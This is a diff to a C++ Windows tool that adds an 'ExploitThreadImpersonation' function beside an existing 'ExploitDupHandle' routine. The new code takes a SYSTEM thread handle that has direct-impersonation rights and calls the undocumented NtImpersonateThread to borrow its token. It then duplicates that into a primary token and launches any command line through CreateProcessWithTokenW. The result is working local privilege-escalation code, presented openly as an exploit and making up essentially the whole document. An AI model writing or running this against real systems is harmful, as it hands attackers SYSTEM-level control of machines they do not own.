@@ -139,6 +139,79 @@ DWORD ExploitDupHandle(HANDLE hProc, LPWSTR commandLine) {
 	return 0;
 }
 
+// NtImpersonateThread: undocumented API — impersonates the security context of
+// ThreadToImpersonate on ThreadHandle. Requires THREAD_DIRECT_IMPERSONATION on
+// the target thread.
+typedef NTSTATUS(WINAPI* fNtImpersonateThread)(
+	HANDLE ThreadHandle,
+	HANDLE ThreadToImpersonate,
+	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
+);
+
+// ExploitThreadImpersonation: given a SYSTEM thread handle with
+// THREAD_DIRECT_IMPERSONATION rights, impersonates its token on the calling thread,
+// promotes to a primary token, and spawns commandLine via CreateProcessWithTokenW.
+DWORD ExploitThreadImpersonation(HANDLE hThread, LPWSTR commandLine) {
+	fNtImpersonateThread NtImpersonateThread =
+		(fNtImpersonateThread)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtImpersonateThread");
+	if (!NtImpersonateThread) {
+		std::cerr << "[-] Failed to resolve NtImpersonateThread\n";
+		return 0;
+	}
+
+	SECURITY_QUALITY_OF_SERVICE sqos = {};
+	sqos.Length = sizeof(sqos);
+	sqos.ImpersonationLevel = SecurityImpersonation;
+	sqos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
+	sqos.EffectiveOnly = FALSE;
+
+	NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
+	if (status != 0) {
+		std::cerr << "[-] NtImpersonateThread failed: 0x" << std::hex << status << "\n";
+		return 0;
+	}
+
+	std::cout << "[+] Impersonating target thread token...\n";
+
+	// Grab the impersonation token now sitting on our thread
+	HANDLE hImpToken = NULL;
+	if (!OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hImpToken)) {
+		std::cerr << "[-] OpenThreadToken failed: " << std::dec << GetLastError() << "\n";
+		RevertToSelf();
+		return 0;
+	}
+
+	// Promote to a primary token so CreateProcessWithTokenW can use it
+	HANDLE hPrimary = NULL;
+	if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL,
+		SecurityImpersonation, TokenPrimary, &hPrimary)) {
+		std::cerr << "[-] DuplicateTokenEx failed: " << std::dec << GetLastError() << "\n";
+		CloseHandle(hImpToken);
+		RevertToSelf();
+		return 0;
+	}
+	CloseHandle(hImpToken);
+
+	// Spawn while still impersonating so SE_IMPERSONATE_PRIVILEGE is present on the thread
+	STARTUPINFOW si = { sizeof(si) };
+	PROCESS_INFORMATION pi = {};
+	DWORD pid = 0;
+
+	if (CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE, NULL,
+		commandLine, 0, NULL, NULL, &si, &pi)) {
+		pid = pi.dwProcessId;
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
+	else {
+		std::cerr << "[-] CreateProcessWithTokenW failed: " << std::dec << GetLastError() << "\n";
+	}
+
+	CloseHandle(hPrimary);
+	RevertToSelf();
+	return pid;
+}
+
 wstring GetProcName(DWORD pid)
 {
 	PROCESSENTRY32 processInfo;
